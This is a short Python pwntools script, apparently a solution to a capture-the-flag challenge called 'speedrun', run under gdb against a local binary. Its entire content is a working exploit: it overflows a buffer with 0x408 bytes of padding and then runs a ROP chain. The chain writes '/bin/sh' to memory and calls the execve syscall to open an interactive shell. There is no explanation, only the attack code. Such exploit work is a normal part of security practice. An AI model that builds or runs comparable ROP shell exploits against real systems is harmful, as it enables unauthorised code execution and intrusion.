#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./speedrun")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
#+"\nbreak *0x400b8b"
+"\nc"
)


#DEFINE

popRax = 0x415664
target = 0x6bb370
popRdi = 0x400686
popRsi = 0x4101f3
popRdx = 0x44be16
movGadget = 0x48d251
syscall = 0x40129c
padding = 0x408*b"\x90"
payload = flat([
    padding,
    p64(popRax),
    p64(target),
    p64(popRdx),
    p64(0x0068732f6e69622f),
    p64(movGadget),
    p64(popRax),
    p64(0x3b),
    p64(popRdi),
    p64(target),
    p64(popRsi),
    p64(0x0),
    p64(popRdx),
    p64(0x0),
    p64(syscall),
])

p.sendlineafter('words?',payload)
#END DEFINE
p.interactive()
